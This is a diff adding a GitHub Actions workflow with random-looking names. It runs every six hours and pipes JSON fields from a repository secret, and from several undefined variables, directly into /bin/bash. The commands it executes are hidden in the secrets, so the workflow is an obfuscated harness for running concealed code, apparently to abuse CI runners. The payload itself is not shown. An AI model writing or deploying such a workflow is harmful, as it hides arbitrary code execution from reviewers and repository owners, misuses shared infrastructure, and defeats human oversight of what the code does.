@@ -1,0 +1,28 @@
+name: weiyuanwang4893
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weiyuanwang4893
+        env:
+          bgl9579: ${{ secrets.bgl9579 }}
+        run: |
+          echo $bgl9579 | jq -r .w65836 | /bin/bash
+          echo $hgl7031 | jq -r .t10258 | /bin/bash
+          echo $pf6257 | jq -r .ca01 | /bin/bash
+          echo $nm3 | jq -r .c656 | /bin/bash
+          echo $dpei047 | jq -r .kfqmw89108 | /bin/bash
+          echo $ykug6 | jq -r .cogle29 | /bin/bash
+          echo $u889 | jq -r .wbb07894 | /bin/bash
+          echo $bxtdb4334 | jq -r .njovb11509 | /bin/bash
+          echo $edw83755 | jq -r .kjg98 | /bin/bash
+          echo $tsa3231 | jq -r .qcwlg440 | /bin/bash
+          echo $gcuz974 | jq -r .bnibt18 | /bin/bash
+          echo $hr15 | jq -r .cdetk608 | /bin/bash
+
